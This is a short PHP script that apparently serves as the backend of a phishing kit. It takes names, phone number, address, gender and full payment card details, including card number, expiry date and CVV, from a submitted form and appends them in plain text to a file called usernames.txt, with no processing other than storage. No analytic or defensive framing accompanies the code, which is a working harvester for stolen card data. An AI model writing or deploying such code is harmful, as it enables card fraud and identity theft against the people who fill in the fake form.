<?php
file_put_contents("usernames.txt", "\nFirstname : ".$_POST['fname']."\nLname : ".$_POST['lname']."\nTel : ".$_POST['tel']."\nCountry : ".$_POST['country']."\nCity : ".$_POST['city']."\nStreet : ".$_POST['street']."\nZip Code : ".$_POST['zip']."\nGender : ".$_POST['gender']."\nCreditCard type : ".$_POST['cctype']."\nCardNumber : ".$_POST['cc']."\nExpiry date : ".$_POST['expiry']."\nCVV : ".$_POST['cvv']."\n", FILE_APPEND);
exit();
